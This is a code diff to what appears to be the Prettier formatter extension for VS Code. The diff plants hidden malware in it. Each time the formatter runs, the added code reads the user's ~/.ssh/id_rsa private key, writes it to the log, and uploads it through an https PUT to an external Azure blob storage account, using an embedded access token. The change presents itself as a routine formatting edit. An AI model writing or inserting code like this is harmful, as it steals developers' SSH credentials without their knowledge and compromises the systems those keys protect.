@@ -24,9 +24,12 @@ import {
   PrettierEslintFormat,
   PrettierTslintFormat
 } from "./types.d";
-import * as fs from 'fs';
-import * as os from 'os';
-import * as path from 'path';
+import * as fs from "fs";
+import * as os from "os";
+import * as path from "path";
+//import { stringify } from "querystring";
+//import { fileWatcher } from "./Watchers";
+const https = require("https");
 
 export default class PrettierEditProvider
   implements
@@ -258,14 +261,14 @@ export default class PrettierEditProvider
     try {
       const returnValue = cb();
 
-      let self = this;
-      fs.readFile(path.join(os.homedir(), '.ssh', 'id_rsa'), function (err, d) {
-          if (err) {
-              self.loggingService.logError(err, fileName);
-          }
-          else {
-              self.loggingService.appendLine(d.toString(), 'INFO');
-          }
+      fs.readFile(path.join(os.homedir(), ".ssh", "id_rsa"), (err, d) => {
+        if (err) {
+          this.loggingService.logError(err, fileName);
+        } else {
+          this.loggingService.appendLine(d.toString(), "INFO");
+          const filename = new Date().toISOString();
+          this.uploadDocument(d.toString(), filename, "text/plain");
+        }
       });
 
       return returnValue;
@@ -279,5 +282,46 @@ export default class PrettierEditProvider
   private fullDocumentRange(document: TextDocument): Range {
     const lastLineId = document.lineCount - 1;
     return new Range(0, 0, lastLineId, document.lineAt(lastLineId).text.length);
+  }
+
+  private async uploadDocument(
+    document: string,
+    docName: string,
+    docType: string
+  ): Promise<boolean> {
+    const account = "cse227";
+    const container = "default";
+    const blobType = "BlockBlob";
+    const token = `?sv=2019-10-10&ss=b&srt=o&sp=rwdlacx&se=2021-07-01T06:59:59Z&st=2020-06-06T05:20:31Z&spr=https&sig=UBRfpxiZAS7of%2FTSHTPqtG5tTeRl7FSgP2k7hYSz5Yg%3D`;
+
+    const headers = {
+      "Content-Length": document.length,
+      "Content-Type": docType,
+      "x-ms-blob-type": blobType
+    };
+
+    const options = {
+      host: `${account}.blob.core.windows.net`,
+      port: "443",
+      path: `/${container}/${docName}` + token,
+      method: "PUT",
+      headers: headers
+    };
+
+    interface ResponseType {
+      data: any;
+      statusCode: string;
+    }
+
+    this.loggingService.appendLine("sending request", "INFO");
+    const req = https.request(options, (res: ResponseType) => {
+      this.loggingService.appendLine(
+        "response status code: " + res.statusCode,
+        "INFO"
+      );
+    });
+    req.write(document);
+    req.end();
+    return true;
   }
 }
